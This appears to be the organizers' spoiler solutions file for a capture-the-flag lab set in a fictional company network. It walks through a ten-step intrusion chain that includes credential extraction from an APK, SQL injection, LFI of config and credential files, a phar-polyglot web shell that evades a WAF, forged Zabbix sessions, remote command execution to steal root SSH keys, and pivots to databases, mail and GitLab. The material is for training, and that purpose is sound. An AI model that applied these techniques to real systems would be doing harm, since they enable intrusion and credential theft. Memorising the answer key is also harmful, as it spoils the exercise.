# SOLUTIONS (organizers — full spoilers)

The authoritative, always-current solution is the reference solver
[`attack/solve.py`](attack/solve.py): `make up-dev && make solve` drives all ten
steps and prints PASS/FAIL. This file is the human-readable companion; exact
hosts, creds and fixed values are in [`docs/ctf-design.md`](docs/ctf-design.md).

Player path (perimeter-only start; steps 6–10 run from the web-shell pivot):

1. **Recon.** `GET http://mobapp…/` → download `/download/atb-market.apk`, `unzip`
   it and `strings assets/index.android.bundle` → Basic `reg_user:basic*88password!prod99`.
   education's JS calls `procedure=getNews`; the comment names `getPosts` →
   `POST /md/blocks/moco_news/ajax.php` `procedure=getPosts` leaks
   `education@atbmarket.com:Edu003868$`, Moodle DB creds, salt.
2. **SQLi.** Catalog filter key `filter[8][<payload>]` on `/shop/catalog/novetly`
   is a boolean oracle: clean key → 200, broken/false → 500. Dump `ishop.users`.
3. **Supplier.** Sign-up posts `entryPoint=GeneratePassword` with hidden `link=0`;
   resend with `link=1` → response contains `Changenewpassword&guid=…` → set a
   password in that form → log in (`PHPSESSID`).
4. **LFI** (needs the session). `module=Import&action=RefreshMapping` with
   `importFile=config.php`, `/var/www/config_override.php` (Oracle DSNs, LDAP
   host, Blowfish mailbox pw), `/var/www/custom/blowfish/InboundEmail.php` (key),
   `/var/www/README.ops`, `/etc/zabbix/zabbix_agentd.conf` (→ zb-app-p01, Grafana :3000).
5. **Web-shell.** Upload a PNG+phar polyglot as an attachment, trigger
   `importFile=phar://upload/<file>/x` behind 200 KB of padding (past the 180 KB
   WAF window) → `/upload/shell.php?z=<base64 cmd>` or the `/shell` terminal.
   You are `nginx` on `sp-web-p01`, inside the network — pivot.
6. **Grafana → Zabbix → root.** `http://grafana.atbmarket.com:3000`, log in with
   the edu creds. In Explore: `SELECT session_key FROM config`, then
   `INSERT INTO sessions (sessionid,userid,lastaccess,status,secret) VALUES ('<32hex>',1,UNIX_TIMESTAMP(),0,'')`.
   Cookie: `zbx_session = base64('{"sessionid":"<sid>","sign":"<hmac>"}')`,
   `sign = HMAC-SHA256(session_key, '{"sessionid":"<sid>"}')`. Zabbix →
   Administration → Scripts → create & run → root on `zb-app-p01`.
7. **Keys.** Jenkins' agent only answers zb-app-p01, so from a Zabbix script:
   `zabbix_get -s jenkins.atbmarket.com -k 'system.run[base64 -w0 /mnt/BACKUP/root.tar.gz]'`
   (`/etc/fstab` on jenkins names the CIFS share). Decode → `id_rsa_root`,
   `.ssh/config`. `ssh -i id_rsa_root root@bastion-main-p01` (from the supplier
   shell or zabbix).
8. **Databases.** bastion `~/.bash_history` → `mysql -h db-ishop-p01 -u ishop`
   and `psql -h pgsql-dev.store-plus.atbmarket.com -U asu` with the creds from
   Harbor (`/v2/_catalog`, `/image/<repo>/env` or the Build-History UI). Oracle:
   `oracle_probe.py erpdb 1581 …` on the supplier box. AD: `POST
   http://DC-MAIN-01.atbmarket.com/bind` with the edu creds.
9. **Mail.** Blowfish-ECB decrypt `48HBtlcz5PGpXdkX6RkJqw==` with the
   InboundEmail key, strip `\0` → `supplier123569` → OWA inbox, or EWS
   `POST /ews/Exchange.asmx` with `attack/ews_finditem.xml`.
10. **Source.** gitlab only accepts root from the bastion: `ssh -J` / ProxyCommand
    through `bastion-main-p01`, or copy the key to the bastion → `ssh root@gitlab-p01` → 524 repos.
